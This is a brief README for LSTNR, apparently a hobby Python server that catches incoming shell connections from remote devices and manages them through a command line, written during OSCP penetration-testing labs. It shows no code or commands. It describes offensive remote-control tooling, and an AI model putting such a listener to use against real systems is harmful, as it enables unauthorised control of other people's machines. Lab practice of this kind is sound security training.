# LSTNR
Python server that receives shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI).

While running, lstnr.py writes to a log file in the directory it is ran in.

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies
